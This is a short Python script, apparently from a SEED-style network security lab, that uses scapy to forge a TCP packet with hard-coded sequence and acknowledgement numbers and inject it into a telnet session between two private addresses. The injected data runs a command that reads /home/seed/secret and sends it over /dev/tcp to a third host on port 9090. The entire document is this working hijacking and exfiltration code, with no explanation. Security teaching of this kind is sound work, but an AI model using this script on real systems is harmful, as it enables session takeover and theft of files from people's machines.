#!/usr/bin/python
from scapy.all import*
print("SENDING SESSION HIJACKING PACKET...")
IPLayer = IP(src="10.0.2.5", dst="10.0.2.6")
TCPLayer = TCP(sport=53364, dport=23, flags="A", seq=3689420155, ack=1001476718)
Data = "\r cat /home/seed/secret > /dev/tcp/10.0.2.4/9090\r"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt, verbose=0)
